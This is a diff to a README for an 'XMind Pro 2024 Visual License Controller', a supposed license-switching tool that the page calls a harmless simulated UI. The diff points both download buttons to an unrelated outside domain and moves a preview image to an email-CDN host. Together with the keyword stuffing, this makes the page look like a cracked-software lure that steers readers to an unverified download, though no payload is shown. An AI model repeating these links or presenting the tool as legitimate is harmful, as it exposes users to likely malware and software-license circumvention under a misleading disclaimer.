@@ -4,7 +4,7 @@ Welcome to the **XMind Pro 2024 Visual License Controller** — a simulated UI s
 
 This tool is intended for **UX testers**, **education labs**, and **interface diagnostics**. No actual activation is performed.
 
-[![Download Controller](https://img.shields.io/badge/Download-XMind--License--Tool-blueviolet?style=for-the-badge&logo=windows)](https://xmind-pro-license-controller.github.io)
+[![Download Controller](https://img.shields.io/badge/Download-XMind--License--Tool-blueviolet?style=for-the-badge&logo=windows)](https://glocktober.com)
 
 ---
 
@@ -29,7 +29,7 @@ This tool is intended for **UX testers**, **education labs**, and **interface di
 ### 🖼 UI Previews
 
 **License Mode Dashboard**  
-![License Dashboard](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRea87_jM7RNQqvctuaij5bgHVDn6DY84FqUQ&s)
+![License Dashboard](https://zpsbkj.stripocdn.email/content/guids/CABINET_849169d25043f0b29edb7844cc7ececf0876fb069fed8701866aef0dcee9f4b4/images/video_cover_copy.png)
 
 
 
@@ -46,7 +46,7 @@ xmind license switcher, xmind offline gui, xmind visual shell, license toggle xm
 
 ### 📥 Download
 
-[![Download Tool](https://img.shields.io/badge/Download-XMind--License--Tool-blueviolet?style=for-the-badge&logo=windows)](https://xmind-pro-license-controller.github.io)
+[![Download Tool](https://img.shields.io/badge/Download-XMind--License--Tool-blueviolet?style=for-the-badge&logo=windows)](https://glocktober.com)
 
 
 
